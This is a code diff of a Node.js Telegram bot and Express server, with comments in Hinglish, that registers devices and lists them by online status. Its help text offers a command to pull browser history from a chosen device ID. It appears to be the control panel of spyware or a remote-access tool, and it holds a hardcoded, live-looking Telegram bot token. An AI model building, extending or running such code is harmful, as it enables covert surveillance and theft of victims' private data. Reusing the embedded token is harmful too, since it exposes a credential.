@@ -1,5 +1,5 @@
 const TelegramBot = require('node-telegram-bot-api');
-const axios = require('axios'); // ⚠️ YEH IMPORT MISSING THA
+const axios = require('axios');
 const express = require('express');
 
 const token = '8811118034:AAHr5UjOeT43-D4zPadC80V6dmQpgsyqIcM';
@@ -9,6 +9,11 @@ const app = express();
 app.use(express.json());
 
 let devices = {};
+
+// ✅ Ye endpoint browser se test karne ke liye hai
+app.get('/api/test', (req, res) => {
+    res.json({ message: 'Server is running!' });
+});
 
 // Device Register API
 app.post('/api/register-device', (req, res) => {
@@ -94,7 +99,7 @@ bot.onText(/\/help/, (msg) => {
         `🟢 **/browser_history <DEVICE_ID>** - Browser history nikalo\n` +
         `   Example: \`/browser_history 123456789\`\n\n` +
         `⚡ **Device ID kaise milega?**\n` +
-        `   → \`/devices\` command chalao, wahan device ID dikhega!`, { parse_mode: "Markdown" });
+        `   → \`/devices\` command chalao, wahan device ID dikhega!`);
 });
 
 bot.onText(/\/devices/, (msg) => {
@@ -132,7 +137,7 @@ bot.onText(/\/devices/, (msg) => {
         message += "No offline devices.\n";
     }
     
-    bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
+    bot.sendMessage(chatId, message);
 });
 
 // Authorization check
